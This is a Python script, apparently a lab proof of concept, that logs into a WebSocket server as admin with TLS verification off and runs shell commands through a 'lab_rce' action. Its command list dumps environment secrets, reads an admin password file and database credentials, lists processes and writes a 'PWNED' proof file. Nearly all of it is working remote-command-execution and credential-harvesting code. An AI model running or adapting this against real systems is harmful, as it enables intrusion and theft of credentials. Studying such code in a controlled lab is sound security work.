import argparse, asyncio, json, secrets, ssl, struct, time
from websockets.asyncio.client import connect

class C:
    def __init__(s, url, origin=None, ca=None):
        s.url, s.origin, s.ca = url, origin, ca; s.frame = 1; s.auth = {}
    async def __aenter__(s):
        ctx = None
        if s.url.startswith("wss:"):
            ctx = ssl.create_default_context(cafile=s.ca)
            if not s.ca:
                ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        s.ws = await connect(s.url, ssl=ctx, proxy=None, origin=s.origin, open_timeout=30)
        return s
    async def __aexit__(s, *e): await s.ws.close()
    async def req(s, action, data=None, auth=True):
        fid = s.frame; s.frame += 2
        env = {"action": action, "data": data or {}}
        if auth and s.auth:
            env.update(s.auth); env["nonce"] = secrets.token_hex(16); env["timestamp"] = time.time()
        await s.ws.send(struct.pack(">IB", fid, 0) + json.dumps(env).encode())
        while True:
            f = await asyncio.wait_for(s.ws.recv(), timeout=45)
            if struct.unpack(">I", f[:4])[0] == fid and f[4] == 1:
                return json.loads(f[5:])
    async def login(s, u, p):
        r = await s.req("login", {"username": u, "password": p}, auth=False)
        if r.get("code") == 200: s.auth = {"username": u, "token": r["data"]["token"]}
        return r

PROOFS = [
    ("identity", "id"),
    ("hostname", "hostname"),
    ("os release", "cat /etc/os-release | head -3"),
    ("env secrets (db/redis/minio creds)", "env | grep -Ei 'password|secret|token' | head -12"),
    ("core admin password file", "cat /app/state/admin_password.txt"),
    ("mysql client creds in config", "grep -A2 -iE '\[database\]|password' /app/state/config.toml | head -12"),
    ("websocket server source", "ls -la /app/src/include/transport/"),
    ("process list", "ps aux | head -12"),
    ("filesystem /app", "ls -la /app"),
    ("file write proof", "echo PWNED-BY-WSS-RCE > /tmp/rce-proof.txt; ls -la /tmp/rce-proof.txt; cat /tmp/rce-proof.txt"),
]

async def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--ws-url", default="wss://127.0.0.1:8008/ws")
    ap.add_argument("--origin", default="https://LAB_HOST:8008")
    ap.add_argument("--password", required=True)
    a = ap.parse_args()
    async with C(a.ws_url, a.origin) as c:
        r = await c.login("admin", a.password)
        print("login:", r.get("code"), r.get("message"))
        for label, cmd in PROOFS:
            resp = await c.req("lab_rce", {"command": cmd})
            d = resp.get("data", {})
            print(f"\n--- {label}: {cmd!r} ---")
            print("  exec      :", d.get("execution"), "| host_process_started:", d.get("host_process_started"))
            print("  exit_code :", d.get("exit_code"), "| timed_out:", d.get("timed_out"))
            out = (d.get("stdout") or "").strip()
            err = (d.get("stderr") or "").strip()
            if out: print("  stdout    :\n" + "\n".join("    " + l for l in out.splitlines()[:14]))
            if err: print("  stderr    :\n" + "\n".join("    " + l for l in err.splitlines()[:6]))

asyncio.run(main())
